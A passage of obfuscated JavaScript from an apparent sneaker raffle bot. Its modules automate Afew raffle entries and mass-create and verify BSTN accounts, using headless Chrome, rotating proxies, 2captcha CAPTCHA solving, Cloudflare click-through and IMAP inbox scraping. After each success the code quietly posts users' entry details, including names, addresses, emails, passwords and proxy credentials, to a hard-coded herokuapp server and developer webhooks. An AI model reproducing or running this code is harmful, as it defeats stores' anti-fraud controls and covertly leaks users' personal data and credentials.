                        _0x38df85 = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x12b1be[0x0] + ':' + _0x12b1be[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x4c0ee7 = JSON['parse'](_0x376369['readFileSync']('sizes.json', 'utf-8')), _0x50497d = _0x40ab6a[_0x17a655]['Url'], _0x4a2d84 = _0x40ab6a[_0x17a655]['Size'], _0x4590e1;
                        async function _0xd5857f() {
                            var _0x4b48f1 = new _0x5ce2f3['CookieJar']();
                            console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x17efe1;
                            let _0x1180b9 = {
                                'method': 'GET',
                                'cookieJar': _0x4b48f1,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x12b1be[0x2] + ':' + _0x12b1be[0x3] + '@' + _0x12b1be[0x0] + ':' + _0x12b1be[0x1]
                            }, _0x1342d8 = _0x50497d['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x4c9539 = _0x1342d8 + '.json', _0x2869c2 = await _0x3f36f4(_0x4c9539);
                            console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x59cd63 = _0x2869c2['data']['product']['variants'];
                            if (_0x4a2d84 != 'RANDOM') {
                                if (_0x59cd63[0x1]['option1']['includes']('W')) {
                                    const _0x13b6c9 = _0x4c0ee7['women']['find'](_0x389282 => _0x389282['EUsize'] === _0x4a2d84);
                                    _0x13b6c9 && (_0x4a2d84 = _0x13b6c9['size']);
                                } else {
                                    if (_0x59cd63[0x1]['option1']['includes']('Y')) {
                                        const _0x804fba = _0x4c0ee7['GS']['find'](_0x1caf02 => _0x1caf02['EUsize'] === _0x4a2d84);
                                        _0x804fba && (_0x4a2d84 = _0x804fba['size']);
                                    } else {
                                        const _0x78a22f = _0x4c0ee7['men']['find'](_0x3a7066 => _0x3a7066['EUsize'] === _0x4a2d84);
                                        _0x78a22f && (_0x4a2d84 = _0x78a22f['size']);
                                    }
                                }
                                for (var _0x5ca8e8 of _0x59cd63) {
                                    _0x5ca8e8['option1'] == _0x4a2d84 && (_0x17efe1 = _0x5ca8e8['id']);
                                }
                            } else {
                                var _0xbb8faf = Math['round'](Math['random']() * (_0x59cd63['length'] - 0x1));
                                _0x17efe1 = _0x59cd63[_0xbb8faf]['id'];
                            }
                            console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3f36f4('https://raffles.afew-store.com/cart/' + _0x17efe1 + ':1'), _0x4590e1 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0xd5857f();
                        } catch (_0x3b17b8) {
                            if (_0x3b17b8['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x3b17b8);
                        }
                        const _0x111f53 = await _0x38df85['newPage']();
                        await _0x111f53['setDefaultNavigationTimeout'](0x1d4c0), await _0x111f53['authenticate']({
                            'username': '' + _0x12b1be[0x2],
                            'password': '' + _0x12b1be[0x3]
                        }), await _0x111f53['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x111f53['setRequestInterception'](!![]), _0x111f53['on']('request', _0x1af96f => {
                            _0x1af96f['resourceType']() === 'image' || _0x1af96f['resourceType']() === 'font' || _0x1af96f['resourceType']() === 'media' ? _0x1af96f['abort']() : _0x1af96f['continue']();
                        });
                        try {
                            await _0x111f53['goto'](_0x4590e1, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x111f53['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x111f53['type']('#checkout_email', '' + _0x40ab6a[_0x17a655]['Email']), await _0xa2099c(0x320), await _0x111f53['type']('#checkout_attributes_instagram', '' + _0x40ab6a[_0x17a655]['Follower']), await _0xa2099c(0x320), await _0x111f53['select']('#checkout_shipping_address_country', '' + _0x40ab6a[_0x17a655]['Country']), await _0x111f53['waitForTimeout'](0x258), await _0x111f53['type']('#checkout_shipping_address_first_name', '' + _0x40ab6a[_0x17a655]['FirstName']), await _0x111f53['waitForTimeout'](0x320), await _0x111f53['type']('#checkout_shipping_address_last_name', '' + _0x40ab6a[_0x17a655]['LastName']), await _0x111f53['waitForTimeout'](0x2bc), await _0x111f53['type']('#checkout_shipping_address_address1', _0x40ab6a[_0x17a655]['Address1'] + '\x20' + _0x40ab6a[_0x17a655]['HouseNumber']), await _0x111f53['waitForTimeout'](0x2bc), await _0x111f53['type']('#checkout_shipping_address_address2', '' + _0x40ab6a[_0x17a655]['Address2']), await _0x111f53['waitForTimeout'](0x2bc), await _0x111f53['type']('#checkout_shipping_address_zip', '' + _0x40ab6a[_0x17a655]['Zip']), await _0x111f53['waitForTimeout'](0x2bc), await _0x111f53['type']('#checkout_shipping_address_city', '' + _0x40ab6a[_0x17a655]['City']), await _0x111f53['waitForTimeout'](0x2bc);
                        if (_0x40ab6a[_0x17a655]['State'] != '')
                            try {
                                const _0x55186f = JSON['parse'](_0x376369['readFileSync']('States.json', 'utf8'));
                                await _0xa2099c(0x1f4);
                                if (_0x40ab6a[_0x17a655]['State']['length'] > 0x2)
                                    for (let _0x2c5c30 of _0x55186f) {
                                        if (_0x2c5c30['Province'] == _0x40ab6a[_0x17a655]['State']) {
                                            await _0x111f53['select']('#checkout_shipping_address_province', _0x2c5c30['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x111f53['select']('#checkout_shipping_address_province', _0x40ab6a[_0x17a655]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0xa2099c(0x1f4), console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xa2099c(0x190), _0x111f53['evaluate'](() => {
                            const _0x4b70f9 = document['querySelector']('#continue_button');
                            for (var _0x4f0182 = 0x0; _0x4f0182 < 0x5; _0x4f0182++) {
                                if (_0x4b70f9) {
                                    _0x4b70f9['click'](), _0x4b70f9['click']();
                                    break;
                                } else
                                    _0xa2099c(0xfa0);
                            }
                        }), await _0x111f53['waitForTimeout'](0x9c4);
                        try {
                            await _0x111f53['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x111f53['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x55267d => _0x55267d['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x111f53['waitForTimeout'](0x7d0), console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x111f53['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xa2099c(0x3e8), await _0x111f53['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x37ac44 => _0x37ac44['submit']()), await _0xa2099c(0x3e8);
                        try {
                            await _0x111f53['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x111f53['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x2df853 => _0x2df853['submit']());
                        try {
                            await _0x111f53['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x139e73 = 'no', _0x48af7e(_0x40ab6a[_0x17a655], _0x5be394), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                                try {
                                    await _0x310f97(_0x2795a0['webhook'], _0x590215['succesDEVMSG']);
                                } catch {
                                }
                            await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x590215['succesDEVMSG']), await _0xa2099c(0xc8);
                            try {
                                await _0x310f97(_0x44d24a, _0x590215['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x1bdb7f['replace']('#', ''),
                                    'module': _0x5be394['name'],
                                    'entrydata': JSON['stringify'](_0xe7b182),
                                    'proxy': '' + _0x10a0ec[_0x17a655]
                                };
                                var _0x421909 = JSON['stringify'](prxdata);
                                let _0x3b0f98 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x421909, _0x3b0f98);
                            } catch (_0x3101dc) {
                            }
                        } catch (_0x2b2791) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x84b29d) {
                        _0x84b29d['message']['includes']('selector') && (_0x84b29d = 'Connection\x20Error');
                        console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20' + _0x84b29d)), _0x440048 = '' + _0x84b29d;
                        var _0x30d651 = await _0x258e8b(_0x40ab6a[_0x17a655], _0x5be394, 'dev', !![], _0x440048);
                        _0x590215['errorDEV'] = { 'embeds': [_0x30d651] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x590215['errorDEV']), await _0x310f97(_0x281108, _0x590215['errorDEV']), _0x139e73 = 'yes';
                    } finally {
                        _0x38df85 && _0x38df85['close']();
                        if (_0x139e73 == 'yes' && _0x2c7428 != 0x5 && _0x440048 != 'Size\x20Not\x20Found') {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c7428 + '\x20/\x205)')), _0x17a655 = _0x17a655 - 0x1, _0x2c7428 = _0x2c7428 + 0x1;
                            continue;
                        }
                        _0x139e73 == 'yes' && _0x2c7428 >= 0x5 && (_0x391951(_0x40ab6a[_0x17a655], _0x5be394), _0x139e73 = 'no', _0x2c7428 = 0x0);
                        if (_0x17a655 + 0x1 == _0x40ab6a['length']) {
                            await _0xa2099c(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x2795a0['AfewDelay'] + '\x20ms'), await _0xa2099c(_0x2795a0['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xc8057a, _0xdacbb5, _0x514c63) {
                    var _0xe3ccb1 = _0xdacbb5, _0x27c3cd = 0x0;
                    for (var _0xa9712f = 0x0; _0xa9712f < _0xdacbb5['length']; _0xa9712f++) {
                        maxTasks = Number(_0x2795a0['threads']);
                        while (_0x27c3cd >= maxTasks) {
                            await _0xa2099c(_0x2795a0['delay']);
                        }
                        async function _0x234bb1(_0x518d11, _0x22028c, _0x51b683, _0x392e9b, _0x4a2b09) {
                            _0x27c3cd++, _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2795a0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x19a7b1;
                            try {
                                await _0x53ad15(_0x22028c, _0x392e9b);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x215576(_0x518d11['name'] + '\x20Task\x20' + (_0x392e9b + 0x1) + '\x20/\x20' + _0x22028c['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                            var _0x52b7e7 = await _0x258e8b(_0x22028c[_0x392e9b], _0x518d11, 'acc', ![]);
                            const _0xa0f0a = { 'succesDEVMSG': { 'embeds': [_0x52b7e7] } }, _0x511974 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0xd6c0a6 = Math['round'](Math['random']() * (_0x51b683['length'] - 0x1)), _0x130f20 = _0x51b683[_0xd6c0a6]['split'](':'), _0x34f15a;
                            try {
                                _0x34f15a = await _0xfda795['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x130f20[0x0] + ':' + _0x130f20[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x34f15a = await _0xfda795['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x130f20[0x0] + ':' + _0x130f20[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x4ea031 = await _0x34f15a['newPage']();
                                await _0x4ea031['authenticate']({
                                    'username': '' + _0x130f20[0x2],
                                    'password': '' + _0x130f20[0x3]
                                }), console['log'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ea031['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4ea031['setRequestInterception'](!![]), _0x4ea031['on']('request', _0x3b5f21 => {
                                    _0x3b5f21['resourceType']() === 'image' ? _0x3b5f21['abort']() : _0x3b5f21['continue']();
                                });
                                try {
                                    await _0x4ea031['goto']('' + _0x511974), await _0x4ea031['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x4ea031['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xa2099c(0x7d0), console['log'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xa2099c(0x190), await _0x4ea031['waitForSelector']('#firstname'), await _0x4ea031['focus']('#firstname'), await _0x4ea031['keyboard']['down']('Control'), await _0x4ea031['keyboard']['press']('A'), await _0xa2099c(0xc8), await _0x4ea031['keyboard']['up']('Control'), await _0x4ea031['keyboard']['press']('Backspace'), await _0x4ea031['type']('#firstname', _0x22028c[_0x392e9b]['FirstName'], { 'delay': 0xf0 }), await _0xa2099c(0x190), await _0x4ea031['focus']('#lastname'), await _0x4ea031['keyboard']['down']('Control'), await _0x4ea031['keyboard']['press']('A'), await _0xa2099c(0xc8), await _0x4ea031['keyboard']['up']('Control'), await _0x4ea031['keyboard']['press']('Backspace'), await _0x4ea031['type']('#lastname', _0x22028c[_0x392e9b]['LastName'], { 'delay': 0xe6 }), await _0xa2099c(0x190), await _0x4ea031['focus']('#email_address'), await _0x4ea031['keyboard']['down']('Control'), await _0x4ea031['keyboard']['press']('A'), await _0xa2099c(0xc8), await _0x4ea031['keyboard']['up']('Control'), await _0x4ea031['keyboard']['press']('Backspace'), await _0x4ea031['type']('#email_address', _0x22028c[_0x392e9b]['Email'], { 'delay': 0x122 }), await _0xa2099c(0x190), await _0x4ea031['type']('#password', _0x22028c[_0x392e9b]['Password'], { 'delay': 0x82 }), await _0xa2099c(0x1f4), await _0x4ea031['type']('#password-confirmation', _0x22028c[_0x392e9b]['Password'], { 'delay': 0x7c }), console['log'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20Sending\x20Request'), await _0xa2099c(0x2bc), await _0x4ea031['$eval']('#form-validate', _0x3491b4 => _0x3491b4['submit']()), await _0xa2099c(0x1388);
                                const _0x3caba0 = await _0x4ea031['$']('#email_address-error');
                                if (_0x3caba0)
                                    throw new Error('Invalid\x20Email');
                                const _0x6ea495 = await _0x4ea031['$']('#password-error');
                                if (_0x6ea495)
                                    throw new Error('Invalid\x20Password');
                                await _0x4ea031['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20Account\x20' + _0x22028c[_0x392e9b]['Email'] + '\x20Generated')), _0x376369['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x22028c[_0x392e9b]['Email'] + ',' + _0x22028c[_0x392e9b]['Password']);
                                try {
                                    _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0xa0f0a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x310f97(_0x203e00, _0xa0f0a['succesDEVMSG']);
                                let _0x8be603 = _0x22028c[_0x392e9b];
                                try {
                                    prxdata = {
                                        'username': _0x1bdb7f['replace']('#', ''),
                                        'module': _0x518d11['name'],
                                        'entrydata': JSON['stringify'](_0x8be603),
                                        'proxy': '' + _0x51b683[_0x392e9b]
                                    };
                                    var _0x4bf2ea = JSON['stringify'](prxdata);
                                    let _0x306668 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x4bf2ea, _0x306668);
                                } catch (_0x251309) {
                                }
                                console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x64505) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20' + _0x64505)), _0x19a7b1 = '' + _0x64505;
                                var _0x3fee7b = await _0x258e8b(_0x22028c[_0x392e9b], _0x518d11, 'acc', !![], _0x19a7b1);
                                _0xa0f0a['errorDEV'] = { 'embeds': [_0x3fee7b] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0xa0f0a['errorDEV']), await _0x310f97(_0x281108, _0xa0f0a['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x34f15a)
                                    _0x34f15a['close']();
                                if (retry == 'yes' && _0x4a2b09 != 0x5)
                                    return console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Task\x20' + (_0x392e9b + 0x1) + '\x20:\x20Retrying\x20(' + (_0x4a2b09 + 0x1) + '\x20/\x205)')), _0x27c3cd--, _0x4a2b09 = _0x4a2b09 + 0x1, _0x234bb1(_0x518d11, _0x22028c, _0x51b683, _0x392e9b, _0x4a2b09);
                                retry == 'yes' && _0x4a2b09 >= 0x5 && (_0x391951(_0x22028c[_0x392e9b], _0x518d11), retry = 'no', _0x4a2b09 = 0x0), _0x27c3cd--, console['log'](_0x24b1d6() + '\x20[' + _0x518d11['name'] + ']\x20Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                            }
                        }
                        _0x234bb1(_0xc8057a, _0xe3ccb1, _0x514c63, _0xa9712f, 0x0), await _0xa2099c(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x54f171, _0x3d2ed0) {
                    var _0x22dd06 = ![], _0x556ab5 = [], _0x433e29 = 0x0;
                    async function _0x24d921() {
                        var _0x1b9e4d = new _0x39794d({
                            'user': _0x2795a0['masterMail'],
                            'password': _0x2795a0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x73151e(_0x23b1c4) {
                            _0x1b9e4d['openBox']('INBOX', ![], _0x23b1c4);
                        }
                        _0x1b9e4d['once']('ready', function () {
                            _0x73151e(function (_0x3fe621, _0xcabba9) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3fe621)
                                    throw _0x3fe621;
                                _0x1b9e4d['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x3fe422, _0x32fbb9) {
                                    if (!_0x32fbb9 || !_0x32fbb9['length'])
                                        console['log'](_0x24b1d6() + '\x20[' + _0x54f171['name'] + ']\x20No\x20mails\x20found'), _0x1b9e4d['end']();
                                    else {
                                        var _0x2fc30b = _0x1b9e4d['seq']['fetch'](_0x32fbb9, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2fc30b['on']('message', function (_0x3c5c46, _0x13c79a) {
                                            var _0x5eb2da = '(#' + _0x13c79a + ')\x20';
                                            _0x3c5c46['on']('body', function (_0x302e7f, _0x354be9) {
                                                _0x3020dc(_0x302e7f, (_0x51602a, _0x153d7c) => {
                                                    var _0x5837ec = _0x153d7c['text']['split']('customer/account/confirm/')[0x1], _0x43fcdc = _0x5837ec['split'](']')[0x0];
                                                    _0x556ab5['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x43fcdc);
                                                });
                                            }), _0x3c5c46['once']('end', function () {
                                            });
                                        }), _0x2fc30b['once']('error', function (_0x2db96b) {
                                            console['log']('Fetch\x20error:\x20' + _0x2db96b), _0x22dd06 = !![];
                                        }), _0x2fc30b['once']('end', function () {
                                            _0x1b9e4d['end'](), _0x22dd06 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x1b9e4d['once']('error', function (_0x4130a4) {
                            console['log'](_0x536226['red'](_0x4130a4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x22dd06 = !![];
                        }), _0x1b9e4d['once']('end', async function () {
                            _0x22dd06 = !![];
                        }), _0x1b9e4d['connect']();
                    }
                    try {
                        _0x24d921();
                        while (!_0x22dd06) {
                            await _0xa2099c(0xfa0);
                        }
                        console['log']('Found\x20' + _0x556ab5['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xa2099c(0x7d0);
                    }
                    for (var _0x4bd0dc = 0x0; _0x4bd0dc < _0x556ab5['length']; _0x4bd0dc++) {
                        maxTasks = Number(_0x2795a0['threads']);
                        while (_0x433e29 >= maxTasks) {
                            await _0xa2099c(_0x2795a0['delay']);
                        }
                        async function _0x18f876(_0x45a02e, _0x242b14, _0x3a1e3b, _0x687de, _0x3d9e7b) {
                            _0x433e29++, _0xfda795['use'](_0x442f24());
                            if (_0x5f22b6 != 'yes')
                                var _0x5f22b6 = '', _0x3d9e7b = 0x0;
                            var _0x2adda3 = Math['round'](Math['random']() * (_0x3a1e3b['length'] - 0x1)), _0x199fbb = _0x3a1e3b[_0x2adda3]['split'](':'), _0x277c3b;
                            try {
                                _0x277c3b = await _0xfda795['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x199fbb[0x0] + ':' + _0x199fbb[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x277c3b = await _0xfda795['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x199fbb[0x0] + ':' + _0x199fbb[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x26505f = await _0x277c3b['newPage']();
                                await _0x26505f['authenticate']({
                                    'username': '' + _0x199fbb[0x2],
                                    'password': '' + _0x199fbb[0x3]
                                }), console['log'](_0x24b1d6() + '\x20[' + _0x45a02e['name'] + ']\x20Task\x20' + (_0x687de + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x26505f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x26505f['setRequestInterception'](!![]), _0x26505f['on']('request', _0x20ea2c => {
                                    _0x20ea2c['resourceType']() === 'image' || _0x20ea2c['resourceType']() === 'font' || _0x20ea2c['resourceType']() === 'media' ? _0x20ea2c['abort']() : _0x20ea2c['continue']();
                                }), console['log'](_0x24b1d6() + '\x20[' + _0x45a02e['name'] + ']\x20Task\x20' + (_0x687de + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x26505f['goto'](_0x242b14[_0x687de]);
                                } catch (_0x15081f) {
                                    _0x5f22b6 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x15081f);
                                }
                                console['log'](_0x24b1d6() + '\x20[' + _0x45a02e['name'] + ']\x20Task\x20' + (_0x687de + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x26505f['waitForTimeout'](0xbb8);
                                try {
                                    await _0x26505f['waitForSelector']('.account-nav'), _0x5f22b6 = 'no', console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x45a02e['name'] + ']\x20Task\x20' + (_0x687de + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x5704d6 = await _0x258e8b(null, _0x45a02e, 'ver', ![]);
                                    const _0x87217a = { 'succesDEVMSG': { 'embeds': [_0x5704d6] } };
                                    await _0x310f97(_0x2c527f, _0x87217a['succesDEVMSG']);
                                } catch {
                                    _0x5f22b6 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x37f492) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x45a02e['name'] + ']\x20Task\x20' + (_0x687de + 0x1) + '\x20:\x20' + _0x37f492));
                                var _0x2f7a2f = _0x37f492, _0xdc2cf4 = await _0x258e8b(null, _0x45a02e, 'ver', !![], _0x2f7a2f);
                                const _0x39b997 = { 'errorDEVMSG': { 'embeds': [_0xdc2cf4] } };
                                _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x39b997['errorDEVMSG']), await _0x310f97(_0x281108, _0x39b997['errorDEVMSG']);
                            } finally {
                                _0x277c3b['close']();
                                if (_0x5f22b6 == 'yes' && _0x3d9e7b != 0x5)
                                    return console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x45a02e['name'] + ']\x20Task\x20' + (_0x687de + 0x1) + '\x20:\x20Retrying\x20(' + _0x3d9e7b + '\x20/\x205)')), _0x433e29--, _0x3d9e7b = _0x3d9e7b + 0x1, _0x18f876(_0x45a02e, _0x242b14, _0x3a1e3b, _0x687de, _0x3d9e7b);
                                _0x5f22b6 == 'yes' && _0x3d9e7b >= 0x5 && (_0x5f22b6 = 'no', _0x3d9e7b = 0x0), _0x433e29--, console['log'](_0x24b1d6() + '\x20[' + _0x45a02e['name'] + ']\x20Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                            }
                        }
                        if (_0x4bd0dc == _0x556ab5['length'] - 0x1) {
